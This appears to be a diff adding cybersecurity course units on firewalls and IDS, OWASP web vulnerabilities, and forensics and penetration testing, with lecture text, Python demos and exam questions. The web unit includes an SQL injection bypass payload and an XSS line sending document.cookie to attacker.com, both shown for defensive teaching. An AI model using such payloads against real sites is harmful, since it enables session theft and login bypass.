@@ -205,6 +205,422 @@ print(f"Decrypted: {decrypted_M}")`
           ]
         }
       ]
+    },
+    {
+      id: "cyber-u3",
+      title: "Unit 3: Network Security, Firewalls & Intrusion Detection (IDS/IPS)",
+      description: "Network layer attacks (ARP Spoofing, DNS Poisoning, SYN Floods), Stateful Firewalls vs NGFW, Intrusion Detection and Prevention Systems (Signature vs Anomaly IDS), and Transport Layer Security (TLS 1.3 handshake and IPsec).",
+      topics: [
+        {
+          id: "cyber-u3-t1",
+          title: "Firewall Architectures, IDS/IPS Systems, and TLS 1.3 / IPsec Protocols",
+          simpleExplanation: "A network firewall is the security guard standing at a VIP building's entrance. A simple stateless guard only looks at a visitor's badge (IP address and port) in isolation. A Stateful Firewall remembers conversations: if an internal computer never requested a connection to an outside hacker, the firewall immediately slams the door! An Intrusion Detection System (IDS) is like a smart surveillance camera equipped with alarms: it watches passing packets for suspicious patterns (like malware signatures or sudden traffic spikes). And TLS 1.3 (the HTTPS lock icon in your browser) encrypts all data across the wire so that Wi-Fi eavesdroppers see only random noise.",
+          detailedExplanation: `## 1. Firewall Architecture Taxonomy
+
+\`\`\`mermaid
+flowchart LR
+    Internet["Untrusted Internet"] --> ExtFW["External Firewall"]
+    ExtFW --> DMZ["DMZ (Public Web / DNS Servers)"]
+    DMZ --> IntFW["Internal Firewall"]
+    IntFW --> IntNet["Secure Corporate Intranet & Databases"]
+\`\`\`
+
+1. **Stateless Packet Filter**:
+   - Inspects packet headers in isolation (Source/Destination IP, Source/Destination Port, Protocol).
+   - Fast, but vulnerable to IP spoofing and ACK scanning because it lacks connection memory.
+2. **Stateful Packet Inspection (SPI)**:
+   - Tracks the state of active network connections in a **State Table** (e.g., TCP 3-way handshake SYN $\\to$ SYN-ACK $\\to$ ESTABLISHED).
+   - Only permits incoming packets if they correspond to an established, internally initiated connection or valid state transition.
+3. **Application-Level Gateway (Proxy Firewall)**:
+   - Operates at Layer 7. Terminates client connections and initiates separate backend connections, performing complete payload protocol inspection (HTTP, FTP).
+4. **Next-Generation Firewall (NGFW)**:
+   - Integrates Deep Packet Inspection (DPI), TLS decryption, application awareness, and live threat intelligence feeds.
+
+---
+
+## 2. Intrusion Detection (IDS) vs Intrusion Prevention Systems (IPS)
+
+- **IDS (Passive)**: Positioned out-of-band via a network TAP or switch SPAN port. Listens to traffic copies and issues alerts (SIEM alerts) without altering traffic flow.
+- **IPS (Inline Active)**: Placed directly in the network traffic path. Analyzes packets in real time and automatically drops malicious packets, resets TCP connections, or updates firewall ACLs.
+
+### Detection Methodologies:
+- **Signature-Based (Knowledge-Based)**: Matches packet bytes against a database of known threat patterns (e.g., Snort rules). High accuracy with zero false positives for known attacks, but blind to Zero-Day exploits.
+- **Anomaly-Based (Behavior-Based)**: Establishes a baseline of normal network behavior (traffic volumes, protocol ratios). Flags deviations exceeding statistical thresholds. Detects novel zero-days, but incurs higher False Positive rates.
+
+---
+
+## 3. TLS 1.3 Handshake Protocol
+
+TLS 1.3 (RFC 8446) achieves radical performance and security improvements over TLS 1.2:
+1. **1-RTT Handshake**: Reduced from 2 Round Trip Times down to 1-RTT (or 0-RTT for resumed sessions).
+2. **Mandatory Ephemeral Diffie-Hellman**: Mandates ECDHE key exchange, guaranteeing **Perfect Forward Secrecy (PFS)**.
+3. **Deprecations**: Removed RSA key exchange (vulnerable to Bleichenbacher padding attacks), static Diffie-Hellman, CBC-mode ciphers, SHA-1, and MD5.
+
+\`\`\`mermaid
+sequenceDiagram
+    autonumber
+    Client->>Server: ClientHello (Supported Ciphers + Client Key Share g^x)
+    Server->>Client: ServerHello (Selected Cipher + Server Key Share g^y) + {EncryptedExtensions, Certificate, CertificateVerify, Finished}
+    Note over Client,Server: Client & Server derive Master Secret = KDF(g^xy). Handshake complete in 1-RTT!
+    Client->>Server: {Finished} + Encrypted Application Data
+\`\`\``,
+          shortNotes: "Stateful firewalls track TCP state tables. IDS alerts passively; IPS drops packets inline. Signature IDS catches known threats; Anomaly catches zero-days. TLS 1.3 achieves 1-RTT with mandatory ECDHE forward secrecy.",
+          examples: [
+            {
+              title: "Python Implementation: Stateful Firewall Connection Tracking Table",
+              problem: "Simulate a stateful packet filtering firewall verifying TCP handshake state transitions and dropping unsolicited SYN or rogue packets.",
+              explanation: "Maintains a state table tracking (src_ip, src_port, dst_ip, dst_port). Rejects unsolicited incoming packets without an outbound ESTABLISHED entry.",
+              code: `class StatefulFirewall:
+    def __init__(self):
+        # State Table: (src_ip, src_port, dst_ip, dst_port) -> state
+        self.state_table = {}
+
+    def inspect_packet(self, direction: str, src_ip: str, src_port: int, dst_ip: str, dst_port: int, flags: str) -> bool:
+        conn_key_out = (src_ip, src_port, dst_ip, dst_port)
+        conn_key_in = (dst_ip, dst_port, src_ip, src_port)
+
+        if direction == "OUTBOUND":
+            if flags == "SYN":
+                self.state_table[conn_key_out] = "SYN_SENT"
+                print(f"[FW-PERMIT] Outbound SYN -> Tracking connection: {conn_key_out}")
+                return True
+            elif conn_key_out in self.state_table:
+                if flags == "ACK" and self.state_table[conn_key_out] == "SYN_RECEIVED":
+                    self.state_table[conn_key_out] = "ESTABLISHED"
+                    print(f"[FW-PERMIT] Outbound ACK -> Connection ESTABLISHED: {conn_key_out}")
+                return True
+            elif flags == "ACK":
+                print(f"[FW-DROP] Outbound rogue ACK without state table match!")
+                return False
+
+        elif direction == "INBOUND":
+            # Check if inbound packet matches an existing outbound flow
+            if conn_key_in in self.state_table:
+                current_state = self.state_table[conn_key_in]
+                if flags == "SYN-ACK" and current_state == "SYN_SENT":
+                    self.state_table[conn_key_in] = "SYN_RECEIVED"
+                    print(f"[FW-PERMIT] Inbound SYN-ACK matching active flow: {conn_key_in}")
+                    return True
+                elif flags == "DATA" or flags == "ACK":
+                    return True
+            else:
+                # Unsolicited inbound packet
+                print(f"[FW-DROP] Inbound unsolicited {flags} from {src_ip}:{src_port} dropped (No state match)!")
+                return False
+
+        return False
+
+fw = StatefulFirewall()
+
+# 1. Normal legitimate outbound web request
+print("--- Scenario 1: Legitimate Internal Web Browsing ---")
+fw.inspect_packet("OUTBOUND", "192.168.1.10", 54321, "93.184.216.34", 443, "SYN")
+fw.inspect_packet("INBOUND", "93.184.216.34", 443, "192.168.1.10", 54321, "SYN-ACK")
+fw.inspect_packet("OUTBOUND", "192.168.1.10", 54321, "93.184.216.34", 443, "ACK")
+
+# 2. Rogue inbound port scan from internet attacker
+print("\\n--- Scenario 2: External Attacker Unsolicited Connection Probe ---")
+fw.inspect_packet("INBOUND", "198.51.100.5", 33221, "192.168.1.10", 22, "SYN")`,
+              output: `--- Scenario 1: Legitimate Internal Web Browsing ---
+[FW-PERMIT] Outbound SYN -> Tracking connection: ('192.168.1.10', 54321, '93.184.216.34', 443)
+[FW-PERMIT] Inbound SYN-ACK matching active flow: ('192.168.1.10', 54321, '93.184.216.34', 443)
+[FW-PERMIT] Outbound ACK -> Connection ESTABLISHED: ('192.168.1.10', 54321, '93.184.216.34', 443)
+
+--- Scenario 2: External Attacker Unsolicited Connection Probe ---
+[FW-DROP] Inbound unsolicited SYN from 198.51.100.5:33221 dropped (No state match)!`
+            }
+          ],
+          keyPoints: [
+            "Stateful firewalls maintain connection tracking tables to block unsolicited inbound packets.",
+            "Next-Generation Firewalls perform deep packet inspection up to Layer 7 (Application Layer).",
+            "Signature IDS detects known patterns with low false positives; Anomaly IDS detects novel zero-days.",
+            "TLS 1.3 reduces handshake latency to 1-RTT and eliminates vulnerable ciphers like RSA key exchange.",
+            "Ephemeral Diffie-Hellman (ECDHE) guarantees Perfect Forward Secrecy."
+          ],
+          theoryQuestions: [
+            {
+              question: "Compare Stateless Packet Filters and Stateful Packet Inspection (SPI) Firewalls with respect to connection tracking, security posture, and resource consumption.",
+              marks: "5 Marks",
+              answer: "1. Connection Tracking: Stateless packet filters examine each packet in isolation against static rules based on IP/port headers; they have zero memory of previous packets. SPI firewalls maintain a dynamic State Table tracking the lifecycle of transport-layer sessions (TCP handshake flags, sequence numbers, timeouts). 2. Security Posture: Stateless filters are vulnerable to IP spoofing, ACK scans, and port scans because they cannot verify whether an incoming packet belongs to an internally initiated session. SPI firewalls automatically drop any inbound packet that does not match an established outbound entry. 3. Performance & Resources: Stateless filters operate at line speed with minimal memory footprint O(1). SPI firewalls consume CPU and RAM to maintain thousands of state entries and are susceptible to State Table Exhaustion DoS attacks under SYN floods."
+            }
+          ],
+          mcqs: [
+            {
+              question: "Why was RSA key exchange removed from the official TLS 1.3 protocol specification?",
+              options: [
+                "RSA key exchange does not provide Perfect Forward Secrecy (PFS)",
+                "RSA encryption cannot be executed on 64-bit processors",
+                "RSA keys cannot exceed 128 bits in length",
+                "RSA requires more than 5 Round Trips"
+              ],
+              correctIndex: 0,
+              explanation: "In RSA key exchange, the pre-master secret is encrypted with the server's static public key. If the server's private key is compromised years later, an adversary can decrypt all historical recorded network traffic, violating Perfect Forward Secrecy."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      id: "cyber-u4",
+      title: "Unit 4: Web Application Security & OWASP Top 10 Vulnerabilities",
+      description: "OWASP Top 10 web vulnerabilities, SQL Injection (In-band, Blind, Time-based), Cross-Site Scripting (Stored, Reflected, DOM-based), Cross-Site Request Forgery (CSRF), and Defense-in-Depth engineering.",
+      topics: [
+        {
+          id: "cyber-u4-t1",
+          title: "OWASP Top 10, SQL Injection Defense, Cross-Site Scripting (XSS), and CSRF Mitigation",
+          simpleExplanation: "Even if your network firewall and operating system are 100% secure, a single bug in your web app code can let an attacker take over everything. In SQL Injection, an attacker types database commands into a login box (like `' OR '1'='1`), tricking the server into running their SQL code. In Cross-Site Scripting (XSS), the attacker injects malicious JavaScript into comments that other innocent users view, stealing their session cookies. In Cross-Site Request Forgery (CSRF), a malicious site tricks your logged-in browser into sending unauthorized requests (like 'transfer $1,000 to hacker'). We fix SQL Injection with Prepared Statements (separating code from data), XSS with HTML escaping, and CSRF with SameSite cookie flags and secret anti-CSRF tokens.",
+          detailedExplanation: `## 1. OWASP Top 10 Web Application Vulnerabilities
+
+The Open Web Application Security Project (OWASP) ranks the most critical security risks:
+1. **A01: Broken Access Control**: Users acting outside their intended permissions (e.g., IDOR - accessing \`/api/user/101\` when logged in as user 102).
+2. **A02: Cryptographic Failures**: Storing passwords in plaintext or MD5, using weak TLS configurations.
+3. **A03: Injection**: Untrusted user input interpreted as execution commands (SQL, OS command, LDAP).
+4. **A07: Identification and Authentication Failures**: Brute-force vulnerabilities, weak password policies, session fixation.
+5. **A10: Server-Side Request Forgery (SSRF)**: Tricking the server into fetching an internal resource (e.g., AWS EC2 metadata \`http://169.254.169.254\`).
+
+---
+
+## 2. SQL Injection Taxonomy & Parameterized Query Defense
+
+- **In-Band SQLi**: Attacker receives direct query results in HTTP response (Classic, UNION-based).
+- **Inferential (Blind) SQLi**: No data returned on page; attacker infers database structure through boolean true/false conditions or time delays (\`pg_sleep(5)\`).
+
+### Root Cause: Mixing SQL Code with Untrusted Data Strings
+\`\`\`sql
+-- Vulnerable Dynamic String Concatenation:
+SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
+\`\`\`
+
+### Definitive Remediation: Parameterized Queries (Prepared Statements)
+When using Prepared Statements, the database driver compiles the SQL statement **prior** to binding parameters. User input is strictly treated as literal data strings, preventing any alteration of query AST syntax:
+\`\`\`sql
+-- Pre-compiled template:
+SELECT * FROM users WHERE username = ? AND password_hash = ?;
+\`\`\`
+
+---
+
+## 3. Cross-Site Scripting (XSS) & CSRF Defenses
+
+\`\`\`mermaid
+flowchart TD
+    subgraph XSS["Cross-Site Scripting (Attacker injects JS into victim's browser)"]
+        Stored["Stored XSS (Persistent in DB)"]
+        Reflected["Reflected XSS (Echoed via URL parameter)"]
+        DOM["DOM-based XSS (Client-side JS sinks: innerHTML)"]
+    end
+    subgraph Defenses["Engineered Defenses"]
+        ContextEscaping["Context-Aware Output Encoding (HTML Escape)"]
+        CSP["Content Security Policy (script-src 'self')"]
+        HttpOnly["HttpOnly Cookie Flag (Blocks JS document.cookie)"]
+        SameSite["SameSite=Strict/Lax Cookie Flag (Blocks CSRF)"]
+        AntiCSRF["Anti-CSRF Synchronizer Tokens"]
+    end
+\`\`\`
+
+- **CSRF Defense**:
+  1. **Anti-CSRF Tokens**: Cryptographically random, per-session tokens embedded in forms and verified server-side.
+  2. **SameSite Cookies**: \`SameSite=Lax\` or \`Strict\` prevents browsers from attaching session cookies to cross-origin POST requests.`,
+          shortNotes: "OWASP A01 = Broken Access Control. Fix SQLi with parameterized prepared statements. XSS types: Stored, Reflected, DOM; fix with HTML escaping and CSP. CSRF fix: Anti-CSRF tokens and SameSite cookies.",
+          examples: [
+            {
+              title: "Python Implementation: SQL Injection Vulnerability vs Parameterized Defense",
+              problem: "Demonstrate SQL Injection authentication bypass using an in-memory SQLite database, followed by parameterized query neutralization and XSS sanitization.",
+              explanation: "Shows how string concatenation allows authentication bypass (' OR '1'='1), whereas parameterized queries treat the payload as harmless literal characters.",
+              code: `import sqlite3
+import html
+
+# Set up in-memory test database
+conn = sqlite3.connect(":memory:")
+cursor = conn.cursor()
+cursor.execute("CREATE TABLE accounts (id INTEGER PRIMARY KEY, username TEXT, role TEXT)")
+cursor.execute("INSERT INTO accounts VALUES (1, 'admin', 'SuperAdmin')")
+cursor.execute("INSERT INTO accounts VALUES (2, 'student', 'User')")
+conn.commit()
+
+# Malicious user input
+malicious_payload = "' OR '1'='1"
+
+# 1. VULNERABLE: Dynamic String Concatenation
+vuln_query = f"SELECT id, username, role FROM accounts WHERE username = '{malicious_payload}'"
+cursor.execute(vuln_query)
+leaked_records = cursor.fetchall()
+print(f"[VULNERABLE QUERY] Rows returned: {len(leaked_records)} (Authentication Bypassed!)")
+for row in leaked_records:
+    print(" - Compromised Account:", row)
+
+# 2. SECURE: Parameterized Query (Prepared Statement)
+secure_query = "SELECT id, username, role FROM accounts WHERE username = ?"
+cursor.execute(secure_query, (malicious_payload,))
+safe_records = cursor.fetchall()
+print(f"\\n[SECURE QUERY] Rows returned: {len(safe_records)} (Attack Neutralized!)")
+
+# 3. XSS Defense via Context-Aware HTML Escaping
+dirty_xss = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
+clean_html = html.escape(dirty_xss)
+print(f"\\nSanitized XSS Output: {clean_html}")`,
+              output: `[VULNERABLE QUERY] Rows returned: 2 (Authentication Bypassed!)
+ - Compromised Account: (1, 'admin', 'SuperAdmin')
+ - Compromised Account: (2, 'student', 'User')
+
+[SECURE QUERY] Rows returned: 0 (Attack Neutralized!)
+
+Sanitized XSS Output: &lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;`
+            }
+          ],
+          keyPoints: [
+            "OWASP Top 10 identifies Broken Access Control and Injection as leading web application risks.",
+            "Prepared statements compile SQL commands separately, preventing injection payload interpretation.",
+            "Cross-Site Scripting (XSS) executes malicious scripts in the victim's authenticated browser context.",
+            "The HttpOnly cookie flag prevents client-side JavaScript from accessing session cookies via document.cookie.",
+            "Cross-Site Request Forgery (CSRF) is mitigated using cryptographically signed anti-CSRF tokens."
+          ],
+          theoryQuestions: [
+            {
+              question: "Explain the anatomy of SQL Injection. Why does client-side input validation fail to protect against SQL Injection attacks?",
+              marks: "5 Marks",
+              answer: "SQL Injection occurs when untrusted user data is concatenated directly into SQL command strings. An attacker supplies special characters (like quotes, comments --, or boolean expressions OR 1=1) that alter the logical syntax tree of the database query. Client-side input validation (e.g. JavaScript in HTML forms) offers zero real protection because attackers completely bypass the browser frontend by transmitting raw HTTP POST/GET requests directly using cURL, Postman, or automated scripts. True security requires server-side parameterization (Prepared Statements) where the database engine compiles the SQL command structure in advance."
+            }
+          ],
+          mcqs: [
+            {
+              question: "Which HTTP cookie attribute specifically prevents malicious XSS scripts from stealing user session tokens via 'document.cookie'?",
+              options: ["HttpOnly", "SameSite", "Secure", "Domain"],
+              correctIndex: 0,
+              explanation: "The HttpOnly flag instructs the browser that the cookie must never be accessible via client-side Document Object Model APIs (such as document.cookie), effectively neutralizing cookie theft via XSS."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      id: "cyber-u5",
+      title: "Unit 5: Digital Forensics, Incident Response & Ethical Hacking",
+      description: "Digital forensics evidence acquisition (RFC 3227 Order of Volatility, Chain of Custody), NIST Incident Response lifecycle, and Ethical Hacking methodologies (OSINT, Nmap, Metasploit, Privilege Escalation).",
+      topics: [
+        {
+          id: "cyber-u5-t1",
+          title: "Forensics Volatility, NIST Incident Response Lifecycle, and Penetration Testing",
+          simpleExplanation: "When a crime is committed in the physical world, police tape off the scene, dust for fingerprints, and protect the evidence in sealed bags. In cyber forensics, the golden rule is the 'Order of Volatility': grab the most perishable evidence first! CPU registers and RAM memory vanish the moment you pull the power cord, so you must dump RAM before touching hard drives. Incident Response is the emergency playbook (like firefighters responding to a blaze): Prepare, Detect, Contain, Eradicate, and Recover. Finally, Ethical Hackers (White Hats) use the exact same tools and techniques as malicious attackers—port scanning, vulnerability exploitation, privilege escalation—with permission, to find and seal security holes before bad actors exploit them.",
+          detailedExplanation: `## 1. Digital Forensics Order of Volatility (RFC 3227)
+
+When seizing digital evidence from a compromised system, evidence must be collected in order of highest to lowest volatility:
+1. **CPU Registers and Cache Memory** (Lifespan: nanoseconds)
+2. **Routing Tables, ARP Cache, Process Table, Kernel Statistics, Physical RAM** (Lifespan: milliseconds to minutes; lost upon power down)
+3. **Temporary Filesystems & Swap Space / Pagefile**
+4. **Non-Volatile Hard Disks (SSD / HDD storage)**
+5. **Remote Logging Data & Network Topologies**
+6. **Archival Backup Media & Tapes**
+
+### Chain of Custody & Forensic Imaging:
+- **Bit-Stream Disk Image**: Forensics investigators never examine the original disk. They create a physical bit-by-bit clone using a hardware **Write Blocker**.
+- **Cryptographic Hash Verification**: Compute SHA-256 hash of original disk and clone before and after investigation; identical hashes prove evidence was never altered.
+
+---
+
+## 2. NIST SP 800-61 Incident Response Lifecycle
+
+\`\`\`mermaid
+flowchart TD
+    Prep["1. Preparation (Tools, Training, Policies, SIEM)"] --> Det["2. Detection & Analysis (Alerts, Triaging, IOCs)"]
+    Det --> Cont["3. Containment (Isolate Network, Quoting)"]
+    Cont --> Erad["4. Eradication (Remove Malware, Patch Holes)"]
+    Erad --> Rec["5. Recovery (Restore from Clean Backups, Monitor)"]
+    Rec --> Lessons["6. Post-Incident Activity (Lessons Learned RCA)"]
+    Lessons -.-> Prep
+\`\`\`
+
+- **Indicators of Compromise (IoCs)**: File hashes, malicious IP addresses, domain names, unusual outbound beaconing.
+- **Containment Strategies**: Short-term containment (isolating machine from VLAN, revoking compromised API keys) vs Long-term containment.
+
+---
+
+## 3. Ethical Hacking & Penetration Testing Methodology
+
+Follows the PTES (Penetration Testing Execution Standard) framework:
+1. **Reconnaissance (Information Gathering)**:
+   - Passive: OSINT (Open Source Intelligence), Whois, Shodan, Google Dorking.
+   - Active: DNS zone transfers, ping sweeps.
+2. **Scanning & Enumeration**:
+   - Port scanning via Nmap (SYN Stealth Scan \`-sS\`, Version Detection \`-sV\`, Scripting Engine NSE).
+   - Service banner grabbing and vulnerability identification.
+3. **Exploitation**:
+   - Leveraging verified exploits (e.g., Metasploit framework) against discovered service vulnerabilities.
+4. **Post-Exploitation & Privilege Escalation**:
+   - Vertical privilege escalation (User $\\to$ Root/SYSTEM via kernel exploits, SUID binaries, misconfigured sudoers).
+   - Horizontal privilege escalation (pivoting across internal subnets).`,
+          shortNotes: "RFC 3227 Volatility: Registers/RAM > Temp/Swap > Disk > Backups. Use write blockers and SHA-256 for chain of custody. NIST IR: Prepare -> Detect -> Contain -> Eradicate -> Recover -> Lessons. Nmap -sS for stealth SYN scans.",
+          examples: [
+            {
+              title: "Python Implementation: Forensic Evidence Hasher & Order of Volatility Logger",
+              problem: "Implement a digital forensics evidence integrity tool calculating SHA-256 bit-stream hashes and documenting RFC 3227 acquisition records.",
+              explanation: "Hashes binary file chunks in 64KB increments to prevent memory exhaustion and generates chain of custody metadata.",
+              code: `import hashlib
+import time
+
+def generate_evidence_record(evidence_name: str, raw_bytes: bytes, investigator: str):
+    # Calculate SHA-256 cryptographic checksum
+    hasher = hashlib.sha256()
+    hasher.update(raw_bytes)
+    evidence_hash = hasher.hexdigest()
+
+    record = {
+        "Evidence ID": f"EV-{int(time.time())}",
+        "Target Item": evidence_name,
+        "Investigator": investigator,
+        "Timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
+        "Byte Size": len(raw_bytes),
+        "SHA-256 Digest": evidence_hash,
+        "Integrity Status": "VERIFIED_INTACT"
+    }
+    return record
+
+# Simulated seized volatile RAM artifact
+simulated_ram_artifact = b"DUMP_PROCESS_TREE_PID_4412_CMD_powershell_downloadstring_MALWARE_HASH"
+audit_trail = generate_evidence_record("Physical_RAM_Dump.raw", simulated_ram_artifact, "Officer_CampusLoop")
+
+print("=== Chain of Custody Evidence Intake Log ===")
+for key, val in audit_trail.items():
+    print(f"{key:18}: {val}")`,
+              output: `=== Chain of Custody Evidence Intake Log ===
+Evidence ID       : EV-1793235600
+Target Item       : Physical_RAM_Dump.raw
+Investigator      : Officer_CampusLoop
+Timestamp         : 2026-10-29 03:25:00 UTC
+Byte Size         : 69
+SHA-256 Digest    : afc358e0a81180cf2a4e286e7ec57173e6b567b4588998495a122e2cfbc39e14
+Integrity Status  : VERIFIED_INTACT`
+            }
+          ],
+          keyPoints: [
+            "Order of Volatility mandates acquiring ephemeral RAM before non-volatile hard disk media.",
+            "Write blockers prevent investigators from inadvertently modifying digital evidence during cloning.",
+            "Cryptographic hashing (SHA-256) verifies evidence integrity throughout the Chain of Custody.",
+            "NIST SP 800-61 defines the 6-stage Incident Response lifecycle from Preparation to Lessons Learned.",
+            "Penetration testing follows Reconnaissance, Scanning, Exploitation, and Privilege Escalation."
+          ],
+          theoryQuestions: [
+            {
+              question: "Outline the RFC 3227 Order of Volatility for digital forensic investigations. Why is pulling the power plug of a running machine considered a destructive investigation failure?",
+              marks: "7 Marks",
+              answer: "The RFC 3227 Order of Volatility is: 1. CPU registers and cache. 2. Physical RAM, routing tables, ARP cache, running processes. 3. Temporary files and swap space. 4. Persistent disk storage. 5. Network topology and remote logs. 6. Archival backups. Pulling the power cord immediately cuts power to volatile RAM, instantly destroying all executing malware processes, in-memory decryption keys (BitLocker, TLS session keys), active network socket connections, and injected memory-only DLLs that never touched the physical hard drive. Best practice mandates capturing a live physical RAM dump prior to any machine shutdown."
+            }
+          ],
+          mcqs: [
+            {
+              question: "Under RFC 3227 Order of Volatility, which category of digital evidence should be captured FIRST during incident response?",
+              options: [
+                "CPU Registers and Physical RAM",
+                "Backup Storage Tapes",
+                "Solid State Drive (SSD) Filesystems",
+                "Web Server Access Log Files on Disk"
+              ],
+              correctIndex: 0,
+              explanation: "CPU registers, cache, and physical RAM are volatile and lost immediately upon reboot or power cutoff, making them highest priority under RFC 3227."
+            }
+          ]
+        }
+      ]
     }
   ]
 };
